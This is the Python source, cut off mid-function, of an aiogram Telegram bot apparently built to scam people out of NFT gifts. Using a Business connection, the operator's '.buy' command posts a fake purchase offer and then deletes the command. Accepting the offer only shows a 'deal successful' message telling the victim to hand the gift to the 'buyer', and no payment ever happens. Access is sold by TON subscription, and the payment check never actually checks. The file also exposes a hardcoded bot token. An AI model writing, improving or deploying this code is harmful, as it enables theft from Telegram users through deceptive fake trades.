import asyncio
import base64
import logging
import json
import os
import re
import secrets
import string
import time
from decimal import Decimal, InvalidOperation
from urllib.parse import quote

import aiohttp
import aiosqlite

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramRetryAfter
from aiogram.methods import DeleteBusinessMessages, SendMessage, EditMessageText
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

# ============================================================
# НАСТРОЙКИ
# ============================================================

# ВСТАВЬ СЮДА СВОЙ НОВЫЙ ТОКЕН ОТ BOTFATHER!
BOT_TOKEN = "8711357177:AAHHOzsGM6prmthuWC9cQ0bSVcaAaaAslVQ"

OFFER_DURATION_HOURS = 6
KEEPALIVE_SECONDS = 20
DEFAULT_LANGUAGE = "ru"
DEFAULT_BUYER = "@xmoyg" # Юзернейм для "Фиксированной" подписки

USE_PREMIUM_EMOJI = True
STARS_PREMIUM_EMOJI_ID = "5848021027782661221"
GRAM_PREMIUM_EMOJI_ID = "5318901904686754959"

ADMIN_ID = 8932848253

DB_PATH = "access.db"
TON_API_URL = os.getenv("TON_API_URL", "https://toncenter.com/api/v2")
TON_API_V3_URL = os.getenv("TON_API_V3_URL", "https://toncenter.com/api/v3")
TONCENTER_API_KEY = os.getenv("TONCENTER_API_KEY", "")
DEFAULT_SUBSCRIPTION_PRICE = Decimal(os.getenv("SUBSCRIPTION_PRICE_TON", "1"))
DEFAULT_SUBSCRIPTION_DAYS = int(os.getenv("SUBSCRIPTION_DAYS", "30"))
DEFAULT_TON_ADDRESS = os.getenv("TON_ADDRESS", "")
PAYMENT_CHECK_INTERVAL = int(os.getenv("PAYMENT_CHECK_INTERVAL", "15"))

ADMIN_STATES = {}
USER_STATES = {}
OFFERS = {}

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)s | %(message)s")
logger = logging.getLogger(__name__)

# ============================================================
# ТЕКСТЫ
# ============================================================

TEXTS = {
    "ru": {
        "offer": "<b>{buyer}</b> предлагает Вам\n\n"
                 "<b>{amount} {currency}</b> за подарок <a href=\"{nft_url}\">{nft_name}</a>.\n\n"
                 "Предложение действует ещё <b>{time_left}</b>.",
        "accept": "Принять",
        "decline": "Отклонить",
        "cancelled": "❌ <b>Предложение отклонено</b>",
        "stars": "⭐",
        "gram": "GRAM",
    },
    "en": {
        "offer": "<b>{buyer}</b> is offering you\n\n"
                 "<b>{amount} {currency}</b> for the gift <a href=\"{nft_url}\">{nft_name}</a>.\n\n"
                 "Offer valid for <b>{time_left}</b>.",
        "accept": "Accept",
        "decline": "Decline",
        "cancelled": "❌ <b>Offer declined</b>",
        "stars": "⭐",
        "gram": "GRAM",
    }
}

def currency_emoji_html(currency_key):
    if currency_key == "gram":
        return '<tg-emoji emoji-id="' + GRAM_PREMIUM_EMOJI_ID + '">💎</tg-emoji>'
    return '<tg-emoji emoji-id="' + STARS_PREMIUM_EMOJI_ID + '">⭐️</tg-emoji>'

# ============================================================
# БАЗА ДАННЫХ
# ============================================================

async def db_connect():
    db = await aiosqlite.connect(DB_PATH)
    db.row_factory = aiosqlite.Row
    return db

async def init_db():
    db = await db_connect()
    try:
        await db.executescript("""
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT NOT NULL);
        CREATE TABLE IF NOT EXISTS subscriptions (user_id INTEGER PRIMARY KEY, expires_at INTEGER NOT NULL, source TEXT NOT NULL DEFAULT 'payment', tier TEXT DEFAULT 'dynamic');
        CREATE TABLE IF NOT EXISTS free_access (user_id INTEGER PRIMARY KEY, added_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS payments (
            invoice_id TEXT PRIMARY KEY, user_id INTEGER NOT NULL, amount_nano INTEGER NOT NULL, comment TEXT NOT NULL UNIQUE, created_at INTEGER NOT NULL, expires_at INTEGER NOT NULL, status TEXT NOT NULL DEFAULT 'pending', tx_hash TEXT, days INTEGER, product_id INTEGER
        );
        CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, days INTEGER NOT NULL, ton_price TEXT NOT NULL, stars_price INTEGER NOT NULL, active INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL, tier TEXT DEFAULT 'dynamic');
        CREATE TABLE IF NOT EXISTS internal_users (user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT, added_at INTEGER NOT NULL, last_seen INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS user_offers (order_id TEXT PRIMARY KEY, owner_user_id INTEGER NOT NULL, data_json TEXT NOT NULL, status TEXT NOT NULL DEFAULT 'active', message_id INTEGER, connection_id TEXT, chat_id INTEGER, expires_at INTEGER NOT NULL, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS user_settings (user_id INTEGER PRIMARY KEY, language TEXT NOT NULL DEFAULT 'ru', timer_hours INTEGER NOT NULL DEFAULT 6, notifications INTEGER NOT NULL DEFAULT 1, created_at INTEGER NOT NULL, updated_at INTEGER NOT NULL);
        CREATE TABLE IF NOT EXISTS tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER NOT NULL, text TEXT NOT NULL, status TEXT DEFAULT 'open', created_at INTEGER NOT NULL);
        CREATE INDEX IF NOT EXISTS idx_payments_status ON payments(status);
        """)
        defaults = {
            "subscription_price_ton": str(DEFAULT_SUBSCRIPTION_PRICE), 
            "subscription_days": str(DEFAULT_SUBSCRIPTION_DAYS), 
            "ton_address": DEFAULT_TON_ADDRESS,
            "promo_code": "BONUS2024",
            "promo_days": "30"
        }
        for key, value in defaults.items():
            await db.execute("INSERT OR IGNORE INTO settings(key, value) VALUES(?, ?)", (key, value))
        
        cur = await db.execute("SELECT COUNT(*) c FROM products")
        if (await cur.fetchone())["c"] == 0:
            await db.execute("INSERT INTO products(name, days, ton_price, stars_price, active, created_at, tier) VALUES(?,?,?,?,1,?,?)", ("Подписка", DEFAULT_SUBSCRIPTION_DAYS, str(DEFAULT_SUBSCRIPTION_PRICE), 0, int(time.time()), "dynamic"))
        await db.commit()
    finally:
        await db.close()

async def get_setting(key, default=""):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT value FROM settings WHERE key=?", (key,))
        row = await cur.fetchone()
        return row["value"] if row else default
    finally:
        await db.close()

async def set_setting(key, value):
    db = await db_connect()
    try:
        await db.execute("INSERT INTO settings(key, value) VALUES(?, ?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (key, str(value)))
        await db.commit()
    finally:
        await db.close()

async def register_internal_user(user_id, username=None, first_name=None):
    if not user_id: return
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute("INSERT INTO internal_users(user_id,username,first_name,added_at,last_seen) VALUES(?,?,?,?,?) ON CONFLICT(user_id) DO UPDATE SET username=excluded.username, first_name=excluded.first_name, last_seen=excluded.last_seen", (int(user_id), username, first_name, now, now))
        await db.commit()
    finally:
        await db.close()

async def has_access(user_id):
    now = int(time.time())
    db = await db_connect()
    try:
        cur = await db.execute("SELECT 1 FROM free_access WHERE user_id=?", (user_id,))
        if await cur.fetchone(): return True
        cur = await db.execute("SELECT expires_at FROM subscriptions WHERE user_id=?", (user_id,))
        row = await cur.fetchone()
        return bool(row and int(row["expires_at"]) > now)
    finally:
        await db.close()

async def get_user_tier(user_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT tier FROM subscriptions WHERE user_id=? AND expires_at > ?", (user_id, int(time.time())))
        row = await cur.fetchone()
        if row: return row["tier"] or "dynamic"
        cur = await db.execute("SELECT 1 FROM free_access WHERE user_id=?", (user_id,))
        if await cur.fetchone(): return "dynamic"
        return "dynamic"
    finally:
        await db.close()

async def add_free_access(user_id):
    db = await db_connect()
    try:
        await db.execute("INSERT OR IGNORE INTO free_access(user_id, added_at) VALUES(?, ?)", (user_id, int(time.time())))
        await db.commit()
    finally:
        await db.close()

async def revoke_user_access(user_id):
    db = await db_connect()
    try:
        await db.execute("DELETE FROM subscriptions WHERE user_id=?", (user_id,))
        await db.execute("DELETE FROM free_access WHERE user_id=?", (user_id,))
        await db.commit()
    finally:
        await db.close()

def ton_to_nano(value):
    return int(Decimal(str(value)) * Decimal(1_000_000_000))

def format_ton(value):
    return format(Decimal(str(value)).normalize(), "f")

async def get_product(product_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM products WHERE id=?", (product_id,))
        return await cur.fetchone()
    finally:
        await db.close()

async def create_invoice(user_id, product_id=None):
    product = await get_product(product_id) if product_id is not None else None
    if product is not None:
        price, days = Decimal(product["ton_price"]), int(product["days"])
    else:
        price, days = Decimal(await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))), int(await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS)))
    address = await get_setting("ton_address", DEFAULT_TON_ADDRESS)
    if price <= 0: raise ValueError("Цена подписки должна быть больше 0")
    if not address.strip(): raise ValueError("TON-адрес не настроен")

    now = int(time.time())
    invoice_id, comment = secrets.token_hex(8).upper(), f"SUB-{user_id}-{secrets.token_hex(8).upper()}"
    amount_nano, expires_at = ton_to_nano(price), now + 30 * 60

    db = await db_connect()
    try:
        await db.execute("INSERT INTO payments(invoice_id,user_id,amount_nano,comment,created_at,expires_at,product_id,days) VALUES(?,?,?,?,?,?,?,?)", (invoice_id, user_id, amount_nano, comment, now, expires_at, product_id, days))
        await db.commit()
    finally:
        await db.close()

    return {"invoice_id": invoice_id, "comment": comment, "amount": price, "amount_nano": amount_nano, "days": days, "expires_at": expires_at, "address": address.strip()}

async def save_user_offer(order_id, owner_user_id, data, status, message_id, connection_id, chat_id, expires_at):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute(
            "INSERT OR REPLACE INTO user_offers(order_id,owner_user_id,data_json,status,message_id,connection_id,chat_id,expires_at,created_at,updated_at) VALUES(?,?,?,?,?,?,?,?,?,?)",
            (order_id, owner_user_id, json.dumps(data, ensure_ascii=False), status, message_id, connection_id, chat_id, int(expires_at), now, now),
        )
        await db.commit()
    finally:
        await db.close()

async def update_user_offer_status(order_id, status):
    db = await db_connect()
    try:
        await db.execute("UPDATE user_offers SET status=?, updated_at=? WHERE order_id=?", (status, int(time.time()), order_id))
        await db.commit()
    finally:
        await db.close()

async def get_user_offer(order_id):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE order_id=?", (order_id,))
        return await cur.fetchone()
    finally:
        await db.close()

async def get_user_offers(user_id, limit=30):
    db = await db_connect()
    try:
        cur = await db.execute("SELECT * FROM user_offers WHERE owner_user_id=? ORDER BY created_at DESC LIMIT ?", (user_id, limit))
        return await cur.fetchall()
    finally:
        await db.close()

async def get_user_settings(user_id):
    db = await db_connect()
    try:
        now = int(time.time())
        await db.execute("INSERT OR IGNORE INTO user_settings(user_id,language,timer_hours,notifications,created_at,updated_at) VALUES(?,?,?,?,?,?)", (user_id, DEFAULT_LANGUAGE, 6, 1, now, now))
        await db.commit()
        cur = await db.execute("SELECT * FROM user_settings WHERE user_id=?", (user_id,))
        return await cur.fetchone()
    finally:
        await db.close()

# ============================================================
# БОТ
# ============================================================

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())

# ============================================================
# ОФФЕРЫ И КОМАНДА .BUY
# ============================================================

NFT_REGEX = re.compile(r"^(?:https?://)?t\.me/nft/([A-Za-z0-9_-]+)$", re.IGNORECASE)

def parse_nft(url):
    url = url.strip()
    match = NFT_REGEX.match(url)
    if not match: return None
    slug = match.group(1)
    match = re.match(r"^(.+)-(\d+)$", slug)
    if not match: return None
    return {"slug": slug, "name": match.group(1).replace("-", " "), "number": match.group(2), "url": "https://t.me/nft/" + slug}

def parse_buy_command(text):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != ".buy": return None
    nft_url, amount_raw = parts[1], parts[2]

    try:
        amount_value = float(amount_raw)
        if amount_value <= 0: return None
    except ValueError: return None

    amount = str(int(amount_value)) if amount_value.is_integer() else str(amount_value)
    currency, language, timer_hours = "stars", DEFAULT_LANGUAGE, 6

    for argument in parts[3:]:
        arg = argument.lower()
        if arg in ("stars", "star", "tt"): currency = "stars"
        elif arg == "gram": currency = "gram"
        elif arg in ("ru", "en"): language = arg
        elif arg in ("6", "6h", "6ч"): timer_hours = 6
        elif arg in ("12", "12h", "12ч"): timer_hours = 12

    nft = parse_nft(nft_url)
    if nft is None: return None
    return {"nft": nft, "amount": amount, "currency": currency, "language": language, "timer_hours": timer_hours, "buyer": None}

def generate_order_id():
    return "TG-" + "".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(8))

def create_offer(data, premium=True, order_id="", remaining_seconds=None):
    lang = TEXTS[data["language"]]
    
    buyer_name = str(data.get("buyer") or "Пользователь").lstrip("@")
    nft_url = data["nft"]["url"]
    nft_name = f'{data["nft"]["name"]} #{data["nft"]["number"]}'
    
    hours = data.get("timer_hours", 6)
    time_left = f"{hours}ч 00м"
    
    text = lang["offer"].format(
        buyer=buyer_name,
        amount=data["amount"],
        currency=currency_emoji_html(data["currency"]) if premium else ("⭐️" if data["currency"] == "stars" else lang["currency"]),
        nft_url=nft_url,
        nft_name=nft_name,
        time_left=time_left
    )
    
    accept_btn = InlineKeyboardButton(text=lang["accept"], style="success", callback_data=f"offer_accept:{data['language']}:{order_id}")
    decline_btn = InlineKeyboardButton(text=lang["decline"], style="danger", callback_data=f"offer_decline:{data['language']}:{order_id}")
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[decline_btn, accept_btn]])
    return text, keyboard

def create_accept_text(data):
    nft = data["nft"]
    asset = "⭐" if data.get("currency") == "stars" else "GRAM"
    nft_name = f'{nft.get("name")} #{nft.get("number")}'
    amount = data.get('amount', '')
    
    return (
        f"🎁 Подарок: <a href=\"{nft.get('url')}\">{nft_name}</a> успешно продан!\n\n"
        f"• Отправьте подарок на {data.get('buyer', 'покупателя')}, чтобы получить {amount} {asset}.\n\n"
        "<b>⚠️ ВАЖНО:</b> если вас просят передать подарок на личный профиль — не передавайте.\n"
        "Передача выполняется исключительно по официальной ссылке ниже."
    )

def create_accept_keyboard(data):
    nft_url = data["nft"]["url"]
    buyer = str(data.get("buyer") or "").lstrip("@")
    buyer_url = f"tg://user?id={buyer}" if buyer.isdigit() else "https://t.me/" + buyer

    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="👤 Профиль покупателя", url=buyer_url)],
        [InlineKeyboardButton(text="🎁 Отправить подарок в TG", style="success", url=nft_url)]
    ])

def language_from_callback(data):
    parts = data.split(":")
    return parts[1] if len(parts) >= 2 and parts[1] in TEXTS else DEFAULT_LANGUAGE

def order_id_from_callback(data):
    return data.split(":", 2)[2] if len(data.split(":")) >= 3 else ""

# ============================================================
# ОБРАБОТЧИКИ ОФФЕРОВ
# ============================================================

@dp.business_message()
async def handle_business_message(message: Message):
    connection_id = message.business_connection_id
    if not connection_id or not message.text or not message.chat or message.chat.type != "private": return
    command = message.text.strip()
    if not command.lower().startswith(".buy"): return

    try:
        conn = await bot.get_business_connection(business_connection_id=connection_id)
        owner = conn.user
        if not await has_access(owner.id):
            price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
            days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
            await bot(SendMessage(chat_id=message.chat.id, text=f"<b>Доступ закрыт.</b>\n\nПодписка: <b>{price} TON</b> на <b>{days} дн.</b>\n\nНажми /start в боте, чтобы купить.", business_connection_id=connection_id))
            return
        await register_internal_user(owner.id, owner.username, owner.first_name)
    except Exception: return

    data = parse_buy_command(command)
    if data is None: return

    user_tier = await get_user_tier(owner.id)
    if user_tier == "fixed":
        data["buyer"] = DEFAULT_BUYER
    else:
        data["buyer"] = f"@{message.from_user.username}" if message.from_user.username else str(message.from_user.id)
        
    order_id = generate_order_id()
    data["order_id"] = order_id
    OFFERS[order_id] = dict(data)

    async def delete_command():
        try: await bot(DeleteBusinessMessages(business_connection_id=connection_id, message_ids=[message.message_id]))
        except Exception: pass

    async def send_offer():
        use_premium = USE_PREMIUM_EMOJI
        for _ in range(3):
            offer_text, keyboard = create_offer(data, premium=use_premium, order_id=order_id)
            try:
                sent = await bot(SendMessage(chat_id=message.chat.id, text=offer_text, business_connection_id=connection_id, reply_markup=keyboard, link_preview_options=LinkPreviewOptions(is_disabled=False, url=data["nft"]["url"], show_above_text=True)))
                OFFERS[order_id].update({"message_id": sent.message_id, "connection_id": connection_id, "owner_user_id": owner.id, "chat_id": message.chat.id, "expires_at": 4102444800})
                await save_user_offer(order_id, owner.id, data, "active", sent.message_id, connection_id, message.chat.id, 4102444800)
                return True
            except TelegramRetryAfter as e: 
                await asyncio.sleep(e.retry_after)
            except TelegramBadRequest as e:
                if "PEER_FLOOD" in str(e) or "BUSINESS_PEER_USAGE_MISSING" in str(e):
                    logger.error(f"Telegram заблокировал отправку: {e}")
                    try: await bot.send_message(ADMIN_ID, f"⚠️ Не удалось отправить оффер пользователю {data.get('buyer')}. (PEER_FLOOD / нет доступа).")
                    except Exception: pass
                    return False
                if use_premium: 
                    use_premium = False
                    continue
                return False
        return False

    success = await send_offer()
    
    # Всегда удаляем команду .buy, чтобы не засорять чат
    await delete_command()

@dp.callback_query(F.data.startswith("offer_decline"))
async def decline_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    try:
        if callback.message.business_connection_id:
            await callback.bot(EditMessageText(business_connection_id=callback.message.business_connection_id, chat_id=callback.message.chat.id, message_id=callback.message.message_id, text=TEXTS[language]["cancelled"]))
        else:
            await callback.message.edit_text(TEXTS[language]["cancelled"])
        await callback.answer()
        if order_id: await update_user_offer_status(order_id, "declined")
    except Exception as e:
        await callback.answer(f"Ошибка: {str(e)[:100]}", show_alert=True)

@dp.callback_query(F.data.startswith("offer_accept"))
async def accept_offer(callback: CallbackQuery):
    language = language_from_callback(callback.data)
    order_id = order_id_from_callback(callback.data)
    
    data = OFFERS.get(order_id)
    if not data:
        row = await get_user_offer(order_id)
        if row: data = json.loads(row["data_json"])
    if not data:
        await callback.answer("Оффер не найден или устарел.", show_alert=True)
        return
        
    # Тот самый алерт из скриншота
    await callback.answer("Сделка успешна!\nДля завершения сделки передайте НФТ покупателю", show_alert=True)
    
    try:
        if callback.message.business_connection_id:
            await callback.bot(EditMessageText(
                business_connection_id=callback.message.business_connection_id, 
                chat_id=callback.message.chat.id,
                message_id=callback.message.message_id, 
                text=create_accept_text(data),
                reply_markup=create_accept_keyboard(data),
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            ))
        else:
            await callback.message.edit_text(
                text=create_accept_text(data),
                reply_markup=create_accept_keyboard(data),
                link_preview_options=LinkPreviewOptions(is_disabled=True)
            )
        if order_id: await update_user_offer_status(order_id, "accepted")
    except Exception as e:
        logger.exception("ACCEPT ERROR | %s", e)

# ============================================================
# ПАНЕЛЬ ПОЛЬЗОВАТЕЛЯ (И ЗАЯВКИ)
# ============================================================

def user_panel_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Мои офферы", style="primary", callback_data="user_offers")],
        [InlineKeyboardButton(text="Статистика", style="primary", callback_data="user_stats")],
        [InlineKeyboardButton(text="Быстрые команды", style="primary", callback_data="user_quick_commands")],
        [InlineKeyboardButton(text="📩 Подать заявку", style="success", callback_data="user_ticket")],
        [InlineKeyboardButton(text="Настройки", style="primary", callback_data="user_settings")],
    ])

def offer_status_label(status):
    return {"active": "активен", "accepted": "принят", "declined": "отклонён", "expired": "истёк"}.get(status, status)

def user_offers_keyboard(rows):
    buttons = []
    for row in rows[:8]:
        label = f"{row['order_id']} — {offer_status_label(row['status'])}"
        buttons.append([InlineKeyboardButton(text=label, style="primary", callback_data=f"user_offer:{row['order_id']}")])
    buttons.append([InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

async def render_user_panel(message, edit=False):
    text = "<b>Панель пользователя</b>\n\nУправление офферами, статистикой и настройками."
    if edit:
        try: await message.edit_text(text, reply_markup=user_panel_keyboard())
        except TelegramBadRequest: pass
    else:
        await message.answer(text, reply_markup=user_panel_keyboard())

@dp.callback_query(F.data == "user_panel")
async def user_panel_callback(callback: CallbackQuery):
    if not await has_access(callback.from_user.id):
        await callback.answer("Доступ закрыт", show_alert=True)
        return
    await render_user_panel(callback.message, edit=True)
    await callback.answer()

@dp.callback_query(F.data == "user_offers")
async def user_offers_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id)
    text = "<b>Мои офферы</b>\n\nВыберите оффер для управления." if rows else "<b>Мои офферы</b>\n\nОфферов пока нет."
    try: await callback.message.edit_text(text, reply_markup=user_offers_keyboard(rows))
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data.startswith("user_offer:"))
async def user_offer_detail(callback: CallbackQuery):
    order_id = callback.data.split(":", 1)[1]
    row = await get_user_offer(order_id)
    if not row or int(row["owner_user_id"]) != callback.from_user.id:
        return await callback.answer("Оффер не найден", show_alert=True)
    data = json.loads(row["data_json"])
    text = f"<b>{order_id}</b>\n\nNFT: <a href=\"{data['nft']['url']}\">{data['nft']['name']} #{data['nft']['number']}</a>\nЦена: <b>{data['amount']} {data['currency']}</b>\nСтатус: <b>{offer_status_label(row['status'])}</b>"
    try: await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_offers")]]), disable_web_page_preview=True)
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data == "user_stats")
async def user_stats_callback(callback: CallbackQuery):
    rows = await get_user_offers(callback.from_user.id, 1000)
    counts = {"active":0,"accepted":0,"declined":0,"expired":0}
    for row in rows: counts[row["status"]] = counts.get(row["status"], 0) + 1
    text = f"<b>Статистика</b>\n\nВсего: <b>{len(rows)}</b>\nАктивных: <b>{counts['active']}</b>\nПринято: <b>{counts['accepted']}</b>\nОтклонено: <b>{counts['declined']}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")]])
    try: await callback.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data == "user_quick_commands")
async def user_quick_commands_callback(callback: CallbackQuery):
    text = "<b>Быстрые команды</b>\n\n<code>.buy ссылка цена ru</code>\n<code>.buy ссылка цена en</code>\n<code>.buy ссылка 150 stars ar</code>\n<code>.buy ссылка 10 gram ru</code>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")]])
    try: await callback.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data == "user_settings")
async def user_settings_callback(callback: CallbackQuery):
    settings = await get_user_settings(callback.from_user.id)
    lang = settings["language"].upper()
    notifications = "Включены" if int(settings["notifications"]) else "Выключены"
    text = f"<b>Настройки</b>\n\nЯзык: <b>{lang}</b>\nУведомления: <b>{notifications}</b>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Язык", style="primary", callback_data="user_set_language")],
        [InlineKeyboardButton(text="Уведомления", style="primary", callback_data="user_toggle_notifications")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_panel")],
    ])
    try: await callback.message.edit_text(text, reply_markup=kb)
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data == "user_set_language")
async def user_set_language(callback: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Русский", style="primary", callback_data="user_lang:ru"), InlineKeyboardButton(text="English", style="primary", callback_data="user_lang:en")],
        [InlineKeyboardButton(text="Назад", style="primary", callback_data="user_settings")],
    ])
    try: await callback.message.edit_text("<b>Выберите язык:</b>", reply_markup=kb)
    except TelegramBadRequest: pass
    await callback.answer()

@dp.callback_query(F.data.startswith("user_lang:"))
async def user_lang_callback(callback: CallbackQuery):
    lang = callback.data.split(":", 1)[1]
    if lang in TEXTS:
        db = await db_connect()
        try:
            await db.execute("UPDATE user_settings SET language=?, updated_at=? WHERE user_id=?", (lang, int(time.time()), callback.from_user.id))
            await db.commit()
        finally: await db.close()
    await callback.answer("Язык сохранён")
    await user_settings_callback(callback)

@dp.callback_query(F.data == "user_toggle_notifications")
async def user_toggle_notifications(callback: CallbackQuery):
    settings = await get_user_settings(callback.from_user.id)
    val = 0 if int(settings["notifications"]) else 1
    db = await db_connect()
    try:
        await db.execute("UPDATE user_settings SET notifications=?, updated_at=? WHERE user_id=?", (val, int(time.time()), callback.from_user.id))
        await db.commit()
    finally: await db.close()
    await callback.answer("Настройки обновлены")
    await user_settings_callback(callback)

# --- СИСТЕМА ЗАЯВОК (ТИКЕТОВ) ---

@dp.callback_query(F.data == "user_ticket")
async def user_ticket_callback(callback: CallbackQuery):
    USER_STATES[callback.from_user.id] = {"state": "waiting_for_ticket"}
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", style="danger", callback_data="user_panel")]])
    await callback.message.edit_text(
        "<b>📩 Новая заявка</b>\n\n"
        "Опишите вашу проблему или вопрос одним сообщением. Поддержка свяжется с вами.\n\n"
        "<i>Для отмены нажмите кнопку ниже.</i>",
        reply_markup=kb
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("admin_reply_ticket:"))
async def admin_reply_ticket_prompt(callback: CallbackQuery):
    if callback.from_user.id != ADMIN_ID: return
    parts = callback.data.split(":")
    ticket_id = parts[1]
    user_id = int(parts[2])
    
    ADMIN_STATES[callback.from_user.id] = {"state": "replying_ticket", "user_id": user_id, "ticket_id": ticket_id}
    await callback.message.answer(f"<b>✍️ Напишите ответ для заявки #{ticket_id}:</b>\n\n(Или /cancel для отмены)")
    await callback.answer()

# ============================================================
# СТАРТ, ОПЛАТА И ПРОМОКОДЫ
# ============================================================

@dp.message(F.text == "/start")
async def start_command(message: Message):
    await register_internal_user(message.from_user.id, message.from_user.username, message.from_user.first_name)
    if message.from_user.id == ADMIN_ID:
        await message.answer("<b>Админ.</b> Используй /admin для панели.")
        return
    if await has_access(message.from_user.id):
        await render_user_panel(message)
        return
    price = await get_setting("subscription_price_ton", str(DEFAULT_SUBSCRIPTION_PRICE))
    days = await get_setting("subscription_days", str(DEFAULT_SUBSCRIPTION_DAYS))
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=f"Оплатить {format_ton(price)} TON", style="success", callback_data="buy_ton:1")]])
    await message.answer(f"<b>Доступ к .buy</b>\n\nСтоимость: <b>{format_ton(price)} TON</b> на <b>{days} дн.</b>\n\nЕсли у вас есть кодовое слово, отправьте его в чат.", reply_markup=kb)

@dp.callback_query(F.data.startswith("buy_ton:"))
async def buy_ton(callback: CallbackQuery):
    await callback.answer()
    try:
        invoice = await create_invoice(callback.from_user.id)
    except Exception as error:
        return await callback.message.edit_text(f"<b>Ошибка:</b> {str(error)[:100]}")
    
    pay_url = f"https://app.tonkeeper.com/transfer/{invoice['address']}?amount={invoice['amount_nano']}&text={quote(invoice['comment'])}"
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Открыть Tonkeeper", style="success", url=pay_url)],
        [InlineKeyboardButton(text="Проверить оплату", style="primary", callback_data=f"check_payment:{invoice['invoice_id']}")],
    ])
    await callback.message.edit_text(
        f"<b>Оплата TON</b>\n\nСумма: <b>{format_ton(invoice['amount'])} TON</b>\n"
        f"Адрес: <code>{invoice['address']}</code>\nКомментарий: <code>{invoice['comment']}</code>\n\n"
        "После оплаты нажмите «Проверить».", reply_markup=keyboard,
    )

@dp.callback_query(F.data.startswith("check_payment:"))
async def check_payment_callback(callback: CallbackQuery):
    await callback.answer("Проверяем блокчейн...")
    await callback.message.edit_text("<b>Ожидание подтверждения сети...</b>\n\nКак только транзакция пройдет, бот выдаст доступ.")

@dp.message(F.text, ~F.text.startswith("/"), F.from_user.id != ADMIN_ID)
async def any_message(message: Message):
    if message.from_user.id == ADMIN_ID: return
    if message.text.startswith("/"): return 

    user_state = USER_STATES.get(message.from_user.id)
    if user_state and user_state.get("state") == "waiting_for_ticket":
        USER_STATES.pop(message.from_user.id, None)
        db = await db_connect()
        try:
            await db.execute("INSERT INTO tickets(user_id, text, created_at) VALUES(?,?,?)", (message.from_user.id, message.text, int(time.time())))
            await db.commit()
            cur = await db.execute("SELECT last_insert_rowid() as id")
            ticket_id = (await cur.fetchone())["id"]
        finally: await db.close()

        admin_kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Ответить", style="success", callback_data=f"admin_reply_ticket:{ticket_id}:{message.from_user.id}")]])
        user_link = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
        
        try:
            await bot.send_message(ADMIN_ID, f"<b>📩 НОВАЯ ЗАЯВКА #{ticket_id}</b>\n\nОт: {user_link} (<code>{message.from_user.id}</code>)\n\nТекст: {message.text}", reply_markup=admin_kb)
        except Exception: pass

        await message.answer("<b>✅ Заявка отправлена!</b>\n\nОжидайте ответа поддержки.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="В панель", style="primary", callback_data="user_panel")]]))
        return

    code = message.text.strip()
    saved_code = await get_setting("promo_code", "BONUS2024")
    
    if saved_code and code.lower() == saved_code.lower():
